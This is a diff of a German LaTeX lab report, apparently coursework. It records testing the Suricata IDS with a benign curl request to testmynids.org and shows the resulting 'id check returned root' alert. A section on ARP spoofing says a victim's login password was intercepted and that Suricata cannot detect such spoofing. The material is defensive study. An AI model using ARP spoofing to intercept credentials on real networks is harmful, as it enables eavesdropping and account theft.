+Um diese zu aktivieren wurde gemäß der Anleitung des Herstellers der Pfad der Regeln, in der Datei \lstinline[breaklines]|/etc/suricata/suricata.yaml| geändert auf \\ \lstinline[breaklines]|default-rule-path: /var/lib/suricata/rules|. \\ \\
+Weitere Konfiguration wurden nicht durchgeführt. \\ \\
+Das IDS wurde anschließend getestet. Dafür wurde der Befehl
+\lstinline[breaklines]|curl http://testmynids.org/uid/index.html|
+ausgeführt. Dadurch wurde eine statische HTML-Datei aufgerufen mit dem Inhalt 
+\lstinline[breaklines]|uid=0(root) gid=0(root) groups=0(root)| 
+Dieser String stellt eine mögliche Ausgabe des \lstinline[breaklines]|id| Befehls dar, welcher genutzt werden kann um den derzeitigen Nutzer und die Gruppen des Nutzers zu erhalten. \\ \\
+Das IDS sollte hier ausschlagen, da die Ausgabe bedeuten würde, das jemand remote den \lstinline[breaklines]|id| Befehl als root ausgeführt hat, was bedeuten würde das jemand vollen Zugriff auf das System hat. \\ \\
+Ob das IDS dies erkannt hat wurde mit dem Befehl
+\lstinline[breaklines]|sudo tail /var/log/suricata/fast.log| 
+überprüft. Die \lstinline[breaklines]|fast.log| Datei enthält die Warnungen des IDS. 
+Die letzte Zeile der Datei war \lstinline[breaklines]|[1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} <ip> -> 192.168.0.220:<port>|. Dies zeigt das der Datenverkehr als potenzieller Datenabfluss erkannt wurde.
 
 \subsection{ARP Spoofing}
 Beim ARP-SPoofing wird das ARP-Protkoll genutzt um den Datenverkehr nicht zum eigentlichen Ziel, sondern zum Angreifer, zu schicken. Das ARP-Protokoll ist dafür zuständig IP-Adresse, welche an sich dynamisch sind, einer statischen MAC-Adresse zuzuordnen. Diese Zuordnung passiert im LAN, im Local Area Network. \\
@@ -543,6 +561,11 @@ Es war möglich eine Anmeldung auf dem Webserver zu lesen und das Passwort des B
 Das eingesetzte IDS, Suricata, bietet keinen Schutz gegen und ist nicht in der Lage ARP-Spoofing zu erkennen. \\ \\
 IDS arbeiten auf der OSI Schicht 3, der Netzwerkschicht \cite{layer-ids}. Das ARP-Protokoll arbeiter auf der Ebene 2, der Sicherungsschicht \cite{layer-arp},\\ \\
 Um das ARP-Spoofing zu erkennen, müsste man permanent die ARP-Tabelle überwachen und kontrollieren, ob IP-Adressen doppelt vergeben werden. Diese Funktion bietet Suricata nicht.
+
+\newpage
+\section{Aufgabenblatt 4}
+
+TODO HIER NOCH MACHEN
 
 \newpage
 \section{Anhang}
